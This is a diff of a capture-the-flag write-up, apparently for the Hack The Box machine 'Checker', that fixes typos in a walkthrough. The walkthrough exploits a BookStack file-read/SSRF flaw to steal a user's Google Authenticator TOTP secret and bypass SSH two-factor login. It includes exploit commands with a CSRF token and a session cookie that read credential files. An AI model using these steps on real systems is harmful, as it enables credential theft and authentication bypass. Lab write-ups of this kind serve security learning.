@@ -118,7 +118,7 @@ Back at the BookStack website. Because we have a valid credential, we can follow
 We could get the payload format from the same author of the PoC on this [Link](https://fluidattacks.com/advisories/imagination/).
 
 The format is `<img src='data:image/png;base64,[BASE64 HERE]'/>` and the parameter name should be `html`, so we need to modify the script to accomodate it.
-You need to the the `requestor.py` inside the `req_with_response` function before the try except block.
+You need to change the the `requestor.py` inside the `req_with_response` function before the try except block.
 
 ```py
 ...
@@ -143,7 +143,7 @@ elif self.verb.value == "PUT":
 ```
 
 It's optional if the first modification works well on your machine. According to the PoC, we need to create a book, then create a page, and save the draft. We need to get the page number, `X-CSRF-TOKEN`, and the BookStack cookie.
-You can retrieve all of these datas from your browser network devtools tab after saving the draft. Now, what file we need to exfiltrate. Because want to bypass the verification code on the SSH, we need to identify what technology behind it.
+You can retrieve all of these data from your browser network devtools tab after saving the draft. Now, what file we need to exfiltrate. Because we want to bypass the verification code on the SSH, we need to identify what technology behind it.
 <br><br>
 I came accross this [Post](https://www.tecmint.com/ssh-two-factor-authentication/) that explain how to setup TOTP on SSH using Google Authenticator. The output from this post is similar to the server so this should be it.
 According to the post, the secret key used for generating the TOTP is stored at `.google_authenticator` inside the user's home directory. Let's try to read `/home/reader/.google_authenticator` file.
@@ -156,7 +156,7 @@ $ python filters_chain_oracle_exploit_bookstack_lfr_ssrf.py --target 'http://che
 [-] File /home/reader/.google_authenticator is either empty, or the exploit did not work :
 ```
 
-Unfortunately, the current user doesn't have read access to it. We need to gather more information. The BookStack already contain some pages, the `Basic Backup with cp` page contains a backup script. This script will backup `/home` to the `/backup/home_backup`, maybe the machine uses this script either way it's worth a try. The Google Authenticator secret key shuold be at `/backup/home_backup/home/reader/.google_authenticator`.
+Unfortunately, the current user doesn't have read access to it. We need to gather more information. The BookStack already contain some pages, the `Basic Backup with cp` page contains a backup script. This script will backup `/home` to the `/backup/home_backup`, maybe the machine uses this script either way it's worth a try. The Google Authenticator secret key should be at `/backup/home_backup/home/reader/.google_authenticator`.
 
 ```bash
 $ python filters_chain_oracle_exploit_bookstack_lfr_ssrf.py --target 'http://checker.htb/ajax/page/9/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}'
